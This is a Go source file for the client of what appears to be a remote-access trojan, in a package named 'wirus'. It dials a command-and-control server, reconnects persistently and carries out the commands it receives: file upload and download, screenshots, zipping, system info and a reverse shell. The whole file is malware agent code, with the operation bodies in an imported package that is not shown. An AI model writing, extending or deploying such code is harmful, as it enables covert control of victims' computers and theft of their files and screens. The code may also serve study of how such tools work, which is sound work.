package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
	"wirus/commands"
)

const (
	connHost = "localhost"
	connPort = "8081"
	connType = "tcp"
)

type Client struct {
	l        net.Listener
	connHost string
	connPort string
	connType string
	conn     net.Conn
}

func (c *Client) fillDefualt() {
	c.connHost = connHost
	c.connPort = connPort
	c.connType = connType
}

func (c *Client) start() {
	c.fillDefualt()
	fmt.Println("Connecting to " + c.connType + " server " + c.connHost + ":" + c.connPort)
	conn, err := net.Dial(c.connType, c.connHost+":"+c.connPort)
	if err != nil {
		conn = c.reconnect()
	}
	c.conn = conn
	go c.polling()
}

func (c *Client) reconnect() net.Conn {
	for {
		if conn, err := net.Dial(c.connType, c.connHost+":"+c.connPort); err == nil {
			c.conn = conn
			fmt.Println("Connected to server.")
			break
		}
		fmt.Println("Reconnecting...")
		time.Sleep(3 * time.Second)
	}
	return c.conn
}

func (c *Client) commands(buff string) {
	// split buff by space
	buffs := strings.Split(buff, " ")
	
	switch buffs[0] {
	case "info":
		commands.SendInfo(c.conn)
	case "exit":
		c.conn.Close()
		os.Exit(0)
	case "file-send":
		fmt.Println("file-send command")
		commands.RecvFile(c.conn, buffs[1])
	case "file-recive":
		fmt.Println("file-recive command")
		commands.SendFile(c.conn, buffs[1], buffs[2])
	case "screenshot":
		fmt.Println("screenshot command")
		commands.SendScreenshot(c.conn)
	
	case "zip":
		fmt.Println("zip command")
		commands.Zip(c.conn, buffs[1])

	case "reverse-shell":
		fmt.Println("reverse-shell command")
		commands.ReverseShellClient(c.conn)
	default:
		fmt.Println("Unknown command")
	}
}

func (c *Client) polling() {
	for {
		buff, err := commands.ReadString(c.conn)
		if err != nil {
			fmt.Println("Connection is dead")
			c.conn.Close()
			c.conn = c.reconnect()
			continue
		}
		c.commands(buff)
	}
}

func main() {
	client := Client{}
	client.start()
	// sleep for a while to wait for server to start
	time.Sleep(3000 * time.Second)
}
